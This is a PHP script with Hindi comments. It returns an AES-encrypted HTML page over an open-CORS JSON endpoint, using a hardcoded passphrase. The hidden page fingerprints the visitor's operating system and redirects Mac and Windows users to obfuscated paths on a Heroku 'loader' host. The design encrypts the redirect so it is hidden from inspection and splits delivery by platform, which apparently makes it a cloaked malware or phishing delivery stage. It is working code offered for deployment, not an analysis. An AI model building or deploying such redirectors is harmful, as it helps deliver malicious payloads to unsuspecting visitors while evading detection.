<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$PASSPHRASE = "MySecretKey@123";

// 🔁 यह HTML OS डिटेक्शन स्क्रिप्ट है – इसमें {{ALPHA}} और {{ANIPH}} प्लेसहोल्डर हैं
$HTML_CONTENT = <<<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting…</title>
    <script>
        // ये वैल्यू Loader द्वारा Replace की जाएँगी
        var ALPHA = '{{ALPHA}}';
        var ANIPH = '{{ANIPH}}';

        // 🧠 OS डिटेक्शन – अब Macintosh भी चेक करेगा
        function myOperatingSystem() {
            var ua = navigator.userAgent;
            console.log("🔍 UserAgent:", ua);
            if (ua.indexOf("Win") !== -1) return "Windows";
            if (ua.indexOf("Mac") !== -1 || ua.indexOf("Macintosh") !== -1) return "MacOS";
            if (ua.indexOf("Linux") !== -1) return "Linux";
            if (ua.indexOf("Android") !== -1) return "Android";
            if (ua.indexOf("iOS") !== -1 || ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
            return "Unknown";
        }

        var os = myOperatingSystem();
        console.log("🖥️ Detected OS:", os);
        localStorage.setItem('alpha', ALPHA);

        // 🔗 अपने Loader का EXACT URL (बिना slash के) – यहाँ Hardcode करें
        var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com';

        if (os === 'MacOS') {
            window.location.href = BASE_URL + '/Ma0cHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
        } else {
            window.location.href = BASE_URL + '/Wi0nHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
        }
    </script>
</head>
<body></body>
</html>
HTML;

function encrypt_salted($data, $passphrase) {
    $salt = openssl_random_pseudo_bytes(8);
    $salted = '';
    $dx = '';
    while (strlen($salted) < 48) {
        $dx = md5($dx . $passphrase . $salt, true);
        $salted .= $dx;
    }
    $key = substr($salted, 0, 32);
    $iv = substr($salted, 32, 16);
    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode('Salted__' . $salt . $ciphertext);
}

$cipher = encrypt_salted($HTML_CONTENT, $PASSPHRASE);
echo json_encode(['cipher' => $cipher]);